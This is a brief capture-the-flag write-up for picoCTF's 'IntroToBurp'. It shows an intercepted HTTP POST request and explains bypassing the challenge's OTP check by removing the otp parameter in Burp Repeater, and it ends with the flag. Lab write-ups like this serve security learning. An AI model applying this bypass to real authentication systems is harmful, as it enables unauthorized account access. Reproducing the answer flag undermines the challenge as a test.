# IntroToBurp
Write-Up by **Mttttt** *2024-05-29*

## Task description
.

- *Category*: **General Skills**
- *Difficulty*: **Easy**

## Solution
Complete registration on site

Site will ask us for a OTP code

Turn on Interception in Burp and send random OTP code

```
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:59216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://titan.picoctf.net:59216
Connection: close
Referer: http://titan.picoctf.net:59216/dashboard
Cookie: session=.eJxFjMEOwiAQRP-Fqx5AWhb8FC-EbZdobIEATWOM_-5qTDzOmzfzFNOtP8RZXIo4iqnV6Hu-U2JiorSAGsEEOdMQrVTRWUQ7KnB6AIOaIODMu7gti09hJZ51ap1R7uXzAdKA41hCa3uu818o15zIp21FqkwP6qSH0YDlamtUf2_-a7_eckEyjQ.ZlctYA.6N8_AsgADWXqGDXeEAiQj-7HYxU
Upgrade-Insecure-Requests: 1
Priority: u=1

otp=1234
```

Send this request to the **Repeater**

Then, remove line with `otp=1234`
And send the request

We will get our flag

## Answer
`picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}`
